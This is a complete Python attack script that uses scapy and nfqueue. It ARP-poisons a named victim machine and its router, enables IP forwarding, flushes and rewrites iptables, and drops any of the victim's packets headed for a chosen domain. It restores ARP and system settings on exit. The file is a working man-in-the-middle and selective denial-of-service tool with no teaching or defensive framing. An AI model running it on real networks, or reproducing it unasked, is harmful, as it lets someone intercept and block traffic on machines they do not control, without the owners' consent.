#!/usr/bin/python
from scapy.all import *
from multiprocessing import Process
import time
import argparse
import os
import sys
import nfqueue
import re

def getRouter(interface):
    return os.popen("ip route | grep " + interface).read().splitlines()[0].split()[2]

def getOwnIp(interface):
    return os.popen('ip addr show ' + interface).read().split('inet ')[1].split('/')[0]

def getMAC(args):
    ownMAC = open('/sys/class/net/' + args.interface + '/address').read().strip()
    victimMAC = re.findall('\[.*\]', os.popen('arping -c 1 -I ' + args.interface + ' ' + args.victimIP).read().splitlines()[1])[0][1:-1]
    routerMAC = re.findall('\[.*\]', os.popen('arping -c 1 -I ' + args.interface + ' ' + args.routerIP).read().splitlines()[1])[0][1:-1]
    return ownMAC, victimMAC, routerMAC

def nslookup(domain):
    ips = [line.split()[1] for line in os.popen("nslookup " + domain + " | grep Address").read().splitlines()]
    ips.pop(0)
    return ips

def getArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('victimIP', help='IP address of a victim')
    parser.add_argument('--domain', '-d', required=True, help='Domain to block')
    parser.add_argument('--interface', '-i', default='wlan0', help='Interface to use, default is wlan0')
    parser.add_argument('--routerIP', '-r', default=None, help='IP address of a router')
    args = parser.parse_args()
    if args.routerIP == None:
        args.routerIP = getRouter(args.interface)
    args.ownIp = getOwnIp(args.interface)
    args.ownMAC, args.victimMAC, args.routerMAC = getMAC(args)
    print('Configuration:')
    print('\t' + str(args)[str(args).find('(') + 1:str(args).find(')')].replace(' ', '\n\t'))
    return args

def osConfiguration(interface):
    print('Adjusting system settings...')
    sysFile = open("/proc/sys/net/ipv4/ip_forward", "w")
    sysFile.write('1')
    sysFile.close()
    sysFile = open("/proc/sys/net/ipv4/conf/" + interface + "/send_redirects", "w")
    sysFile.write('0')
    sysFile.close()
 
    os.system("iptables -Z")
    os.system("iptables -F")
    os.system("iptables -X")
    os.system("iptables --append FORWARD --in-interface " +  interface + " -j NFQUEUE")
    os.system("iptables -t nat --append POSTROUTING --out-interface " + interface + " -j MASQUERADE")

def osRestore(interface):
    print('Restoring system settings...')
    sysFile = open("/proc/sys/net/ipv4/ip_forward", "w")
    sysFile.write('0')
    sysFile.close()
    sysFile = open("/proc/sys/net/ipv4/conf/" + interface + "/send_redirects", "w")
    sysFile.write('1')
    sysFile.close()
    os.system("iptables -Z")
    os.system("iptables -F")
    os.system("iptables -X")

def createNetFilterQueue():
    queue = nfqueue.queue()
    queue.open()
    queue.bind(socket.AF_INET)
    queue.set_callback(callback)
    queue.create_queue(0)
    return queue

def arpPoison(args):
    print('Starting ARP poisoning...')
    conf.iface = args.interface
    victimPacket = ARP(op='is-at', hwsrc=args.ownMAC)
    routerPacket = ARP(op='is-at', hwsrc=args.ownMAC)
    victimPacket.psrc = args.routerIP
    victimPacket.pdst = args.victimIP
    victimPacket.hwdst = args.victimMAC
    routerPacket.psrc = args.victimIP
    routerPacket.pdst = args.routerIP
    routerPacket.hwdst = args.routerMAC
    while True:
        send(victimPacket, verbose=False)
        send(routerPacket, verbose=False)
        time.sleep(5.0)

def arpRestore(args):
    print('Restoring ARP table...')
    conf.iface = args.interface
    victimPacket = ARP(op='is-at', hwsrc=args.routerMAC)
    routerPacket = ARP(op='is-at', hwsrc=args.victimMAC)
    victimPacket.psrc = args.routerIP
    victimPacket.pdst = args.victimIP
    victimPacket.hwdst = args.victimMAC
    routerPacket.psrc = args.victimIP
    routerPacket.pdst = args.routerIP
    routerPacket.hwdst = args.routerMAC
    send(victimPacket, verbose=False)
    send(routerPacket, verbose=False)
 
def callback(payload):
    data = payload.get_data()
    packet = IP(data)
    print("Packet src: " + packet.src + " | Packet dst: " + packet.dst)
    if packet.dst in domainIps:
        payload.set_verdict(nfqueue.NF_DROP)
    else:
        payload.set_verdict(nfqueue.NF_ACCEPT)

def main():
    args = getArguments()
    global domainIps
    domainIps = nslookup(args.domain)
    osConfiguration(args.interface)
    queue = createNetFilterQueue()
    arpPoisonDaemon = Process(target=arpPoison, args=(args,))
    arpPoisonDaemon.daemon = True
    arpPoisonDaemon.start()
    try:
        queue.try_run() 
    except KeyboardInterrupt:
        queue.unbind(socket.AF_INET)
        queue.close()
        arpPoisonDaemon.terminate()
        arpRestore(args)
        osRestore(args.interface)

if __name__ == '__main__':
    main()
